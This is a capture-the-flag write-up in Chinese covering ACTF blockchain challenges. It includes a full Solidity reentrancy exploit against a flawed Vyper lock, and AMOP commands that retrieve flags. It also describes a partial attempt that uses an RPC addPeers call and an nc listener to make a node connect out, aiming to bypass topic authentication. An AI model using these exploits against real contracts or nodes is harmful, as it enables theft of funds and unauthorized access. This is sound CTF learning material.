### Viper 

Vyper 0.2.16 经典重入 | 听过没打过

https://neptunemutual.com/blog/vyper-language-zero-day-exploits/

用已知漏洞绕过lock

https://hackmd.io/@vyperlang/HJUgNMhs2#Vulnerability-Introduced-Malfunctioning-Re-Entrancy-Locks-in-v0215

节点可以 geth attach http://120.46.58.72:8545/

利用重入漏洞，在使用veth换eth的过程中将veth存入viper合约，在增加viper的veth余额的同时，增加自己账户在viper中的veth和eth余额。

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Viper {
    function deposit(int128, uint256) external payable ;
    function withdraw(int128, uint256) external ;
    function swap(int128, int128, uint256) external payable ;
    function isSolved() view external returns (bool);
}

interface VETH {
    function approve(address, uint256) external payable ;
}
contract exp {

    Viper public viper = Viper(0x6A933E75E415e0E56455f44dD0e486B3258F89a0);
    VETH public veth = VETH(0x692ab1BA329Dd0CAdDffF1c23FfCC3614375aE69);
    uint256 public count;

    constructor() payable {
        // 4 ether
    }

    function go() public {
        veth.approve(address(viper), type(uint256).max);
        viper.swap{value: 3 ether}(0, 1, 3 ether);
        viper.withdraw(1, 6 ether);
        viper.swap{value: 1 wei}(1, 0, 0);
        viper.withdraw(1, 6 ether);
        viper.swap(1, 0, 6 ether);
        viper.withdraw(0, 6 ether);
    }

    receive() external payable {
        if (count==0) {
            count++;
            viper.deposit(1, 6 ether);
        }
    }
}
Despite its venomous nature, the farmer felt compassion and decided to help it...

[1] Generate new playground to deploy the challenge you play with
[2] Check if you have solved the challenge and get your flag
[3] Show all contract source codes of the challenge if available

 ➤ Please input your choice: 2
 ➤ Please input your token: v4.local.Wr3CK2ihQ9idA6UAtZ-v-Sb3qsDFVO4R7E1lGuDR_l044NsCUx4pqjQu8txI_UlrHYpHdFtG8dKtrj47vsTtdq5WdejtuTPRwT0ovnt2Nzjhy-jRGJDo1NY6Ij18E_0gHIEfGsdfc0Zhlh-NBsyjsk1wQoOkeyA1rA4q7B248l-l4A

 ⚑ Congrats! Here is your flag: ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
```

### AMOP 1

> Description
>
> [FISCO BCOS](https://github.com/FISCO-BCOS/FISCO-BCOS/tree/v2.9.1) is a blockchain that allows you to pass messages.
>
> Service
>
> Access `120.46.58.72:30201` for the channel endpoint.

https://fisco-bcos-doc.readthedocs.io/zh-cn/latest/docs/sdk/java_sdk/amop.html

```Shell
root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp "apps/*:lib/*:conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1
SLF4J: Class path contains multiple SLF4J bindings.
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
Start test
Step 2:Receive msg, time: 2023-10-29 09:55:20topic:flag1 content:ACTF{Con5oR7ium_B1ock_
```

```
root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe flag2 conf/privkey
SLF4J: Class path contains multiple SLF4J bindings.
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
Start test
Step 2:Receive msg, time: 2023-10-28 14:55:18topic:flag2 content:cHAiN_sO_INterESt1NG}
```

### AMOP 2 

> Description
>
> FISCO BCOS is a blockchain that allow you to pass message.
>
> Service
>
> - Access `120.46.58.72:48547` for RPC
> - Access `120.46.58.72:41202` for channel endpoint

无密钥获取私有话题广播🥲

链上信使协议：https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/manual/amop_protocol.html

给了RPC应该有用

> https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/sdk/java_sdk/amop.html 注意： 1. AMOP私有话题目前只支持非国密算法。请使用 [`](https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/sdk/java_sdk/amop.html#id10)生成公私钥脚本 <./account.md>_ 生成非国密公私钥文件. 2. 如果私有话题的发送者和订阅者连接了同一个节点，则被视为是同一个组织的两个SDK，这两个不需要进行私有话题认证流程即可通过该私有话题通信。 3. 如果私有话题的两个发送者A1和A2连接了同一个节点Node1，该私有话题的订阅者B连接了Node2，Node1和Node2相连。若A1已经和B完成了私有话题的认证，则A2可以不经过认证，向B发送私有话题消息，因为同机构的A1已经对订阅者B的身份进行了验证。

考虑通过RPC直接连接区块链内部P2P网络找到发送者已经连接的node来绕过身份验证

> The private AMOP is implemented based on the non-private one, try to learn how BCOS do it and hack the background communication.

应该就是这个意思。。。其实现源码https://github.com/FISCO-BCOS/FISCO-BCOS/tree/master/bcos-rpc/bcos-rpc/amop 

AMOP通信协议中的p2p node是合约节点吗

```Shell
root@Aliyun-ubuntu2004:~# curl -X POST --data '{"jsonrpc":"2.0","method":"getPeers","params":[1],"id":1}'  http://120.46.58.72:48547 | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   803  100   746  100    57  10081    770 --:--:-- --:--:-- --:--:-- 10851
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": [
    {
      "Agency": "agency",
      "IPAndPort": "127.0.0.1:30300",
      "Node": "node0",
      "NodeID": "6aff6f3d6b6570b47302fe87f5701b9999ffe42a495497dc139b15214ab7e2ea1f70108a991290f4dfdc0b65d5c5d2a1705f04be55cb5fe64b0c8e002038ce4f",
      "Topic": [
        "#!$PushChannel_#!$TopicNeedVerify_flag",
        "#!$PushChannel_#!$TopicNeedVerify_privTopic",
        "_block_notify_1"
      ]
    },
    {
      "Agency": "agency",
      "IPAndPort": "127.0.0.1:30301",
      "Node": "node1",
      "NodeID": "67e77da6c71151b1c639dc7f9e4b0eddc5ff2f5748e6cf31be828f6f870eaabc7a9444fb6f1ce9fd2c225782ddb5bb0e0e32bbf35783b52baeabd10cfac0748d",
      "Topic": [
        "#!$VerifyChannel_#!$TopicNeedVerify_flag_e746bfa8bcfb449386e83ec2362f6d64",
        "#!$VerifyChannel_#!$TopicNeedVerify_privTopic_86ef413308c84b248fac09e23a0d5259",
        "_block_notify_1"
      ]
    }
  ]
}
```

应该就这俩node

```Shell
root@Aliyun-ubuntu2004:~# curl -X POST --data '{"jsonrpc":"2.0","method":"queryPeers","params":[],"id":1}'  http://120.46.58.72:48547 | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   147  100    58   1750    690 --:--:-- --:--:-- --:--:--  2440
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": [
    "120.46.58.72:30201",
    "127.0.0.1:30201",
    "127.0.0.1:30203",
    "127.0.0.1:30300",
    "127.0.0.1:30301",
    "127.0.0.1:30302"
  ]
}
```

猜测这个`120.46.58.72:30201`应该是channel endpoint所用的peer

addPeer一个自己的IPAndPort到连接配置

```Shell
root@Aliyun-ubuntu2004:~# curl -X POST --data '{"jsonrpc":"2.0","method":"addPeers","params":[["120.26.39.182:8887"]],"id":1}'  http://120.46.58.72:48547 | jq
root@Aliyun-ubuntu2004:~# nc -lvnp 8887 | base64
Listening on 0.0.0.0 8887
Connection received on 120.46.58.72 53704
FgMBATYBAAEyAwNXj+rEtH2OkrnSwhr7sg3KVGBJ0BlacqK36EKWsq2x/QAArsAwwCzAKMAkwBTA
CgClAKMAoQCfAGsAagBpAGgAOQA4ADcANgCIAIcAhgCFwDLALsAqwCbAD8AFAJ0APQA1AITAL8Ar
wCfAI8ATwAkApACiAKAAngBnAEAAPwA+ADMAMgAxADDgEwCaAJkAmACXAEUARABDAELAMcAtwCnA
JcAOwAQAnAA8AC8AlgBBAAfAEcAHwAzAAgAFAATAEsAIABYAEwAQAA3ADcADAAoA/wEAAFsACwAE
AwABAgAKAB4AHAAdABcAGQAcABsAGAAaABYADgANAAsADAAJAAoAIwAAAA0AJAAiBwEHAwYBBgIG
AwUBBQIFAwQBBAIEAwMBAwIDAwIBAgICAwAPAAEB
```

可以拿到一点数据。不知道是啥。sdk.key应该能解这个吧 

应该是通信报文的头部

[[AmopSubscriber.java\]](https://github.com/FISCO-BCOS/java-sdk-demo/blob/main-2.0/src/main/java/org/fisco/bcos/sdk/demo/amop/tool/AmopSubscriber.java) => [[Amop.java\]](https://github.com/FISCO-BCOS/java-sdk/blob/master/src/main/java/org/fisco/bcos/sdk/v3/amop/Amop.java) => [[BcosSDKJniObj.java\]](https://github.com/FISCO-BCOS/bcos-sdk-jni/blob/master/src/main/java/org/fisco/bcos/sdk/jni/BcosSDKJniObj.java) => [[org_fisco_bcos_sdk_jni_amop_AmopJniObj.cpp\]](https://github.com/FISCO-BCOS/bcos-sdk-jni/blob/master/src/main/c/jni/org_fisco_bcos_sdk_jni_amop_AmopJniObj.cpp) => ...

用python sdk的remote rpc应该会简单一点

https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/design/protocol_description.html#amop

要在node上连接一个活跃的observer/peer，然后绕过鉴权。没有现成轮子。

在集群中应该所有节点都会尝试连接，要把其他节点的数据包拒绝掉